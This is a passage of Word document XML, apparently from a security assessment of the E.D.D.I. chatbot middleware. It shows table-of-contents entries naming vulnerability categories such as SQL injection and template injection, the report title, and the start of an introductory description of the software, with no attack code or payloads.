            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6824A59B" w14:textId="069300AA" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039320" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.15.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Privacy Violation</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039320 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>51</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="60F2163B" w14:textId="238737CB" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039321" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.16.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Resource Injection</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039321 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>53</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="424BB6FE" w14:textId="7359F1A4" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039322" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.17.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Information Leak</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039322 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>54</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="6DB7F4C7" w14:textId="547351CD" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039323" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.18.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Server Side Template Injection (SSTI)</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039323 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>55</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="45367393" w14:textId="48E545D2" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039324" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.19.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>System Information Leak: Internal</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039324 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>56</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="54FC9CDA" w14:textId="760D115D" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039325" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.20.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>SQL-injection</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039325 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>57</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="7A1A37D9" w14:textId="64EBB04F" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario3"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="1440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039328" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>1.4.21.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Weak Cryptographic Hash</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039328 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>58</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="5ADD8C2C" w14:textId="49F81722" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario1"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="440"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039329" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>PRIVACY ANALYSIS</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039329 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="00575612" w14:textId="543C43D7" w:rsidR="002039E1" w:rsidRDefault="004E7FC7">
          <w:pPr>
            <w:pStyle w:val="Sommario2"/>
            <w:tabs>
              <w:tab w:val="left" w:pos="960"/>
              <w:tab w:val="right" w:leader="dot" w:pos="9019"/>
            </w:tabs>
            <w:rPr>
              <w:noProof/>
            </w:rPr>
          </w:pPr>
          <w:hyperlink w:anchor="_Toc200039330" w:history="1">
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>2.1</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1" w:rsidRPr="00491B49">
              <w:rPr>
                <w:rStyle w:val="Collegamentoipertestuale"/>
                <w:noProof/>
              </w:rPr>
              <w:t>Privacy Assessment</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:tab/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="begin"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:instrText xml:space="preserve"> PAGEREF _Toc200039330 \h </w:instrText>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="separate"/>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:t>60</w:t>
            </w:r>
            <w:r w:rsidR="002039E1">
              <w:rPr>
                <w:noProof/>
                <w:webHidden/>
              </w:rPr>
              <w:fldChar w:fldCharType="end"/>
            </w:r>
          </w:hyperlink>
        </w:p>
        <w:p w14:paraId="476D1E33" w14:textId="27036128" w:rsidR="002039E1" w:rsidRDefault="002039E1">
          <w:r>
            <w:rPr>
              <w:b/>
              <w:bCs/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:p>
      </w:sdtContent>
    </w:sdt>
    <w:p w14:paraId="4B94D5A5" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DEEC669" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3656B9AB" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45FB0818" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="049F31CB" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53128261" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62486C05" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4101652C" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4B99056E" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1299C43A" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4DDBEF00" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3461D779" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CF2D8B6" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0FB78278" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1FC39945" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0562CB0E" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="34CE0A41" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="62EBF3C5" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D98A12B" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2946DB82" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5997CC1D" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="110FFD37" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6B699379" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FE9F23F" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1F72F646" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08CE6F91" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="61CDCEAD" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:spacing w:before="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:smallCaps/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="59AEF2C0" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="001A39A9" w:rsidP="4E46F641">
      <w:pPr>
        <w:spacing w:before="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:smallCaps/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:smallCaps/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Web application: E.D.D.I.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB9E253" w14:textId="77777777" w:rsidR="00910649" w:rsidRPr="005432B6" w:rsidRDefault="00910649">
      <w:pPr>
        <w:spacing w:after="120"/>
        <w:ind w:left="360"/>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3FCC47CD" w14:textId="77777777" w:rsidR="00910649" w:rsidRDefault="001A39A9">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">E.D.D.I. (Enhanced Dialog-Driven Interface) is open-source middleware software developed by Labs.ai to enable the management of advanced conversations in artificial intelligence applications. Designed for deployment in modern cloud infrastructures, E.D.D.I. facilitates the integration and orchestration of chatbots through conversational APIs such as OpenAI ChatGPT, Hugging Face, Anthropic Claude, Google Gemini, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Ollama</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Jlama</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="005432B6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71288D08" w14:textId="70EF99D2" w:rsidR="001425CA" w:rsidRDefault="001425CA">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00AE3DDE">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>architecture</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> of this software </w:t>
      </w:r>
      <w:r w:rsidR="00A85275">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
